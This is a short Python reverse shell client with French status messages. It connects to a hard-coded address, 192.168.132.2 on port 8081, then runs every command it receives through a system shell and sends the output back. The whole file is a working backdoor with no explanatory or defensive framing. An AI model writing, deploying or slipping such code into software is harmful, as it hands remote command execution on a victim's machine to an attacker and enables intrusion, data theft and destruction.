import socket
import subprocess

REMOTE_HOST = '192.168.132.2'
REMOTE_PORT = 8081
client = socket.socket()
print("[-] Connexion en cours d'initialisation...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connexion initialisée!")

while True:
    print("[-] En attente de commande...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Envoi de la response...")
    client.send(output + output_error+ b'.')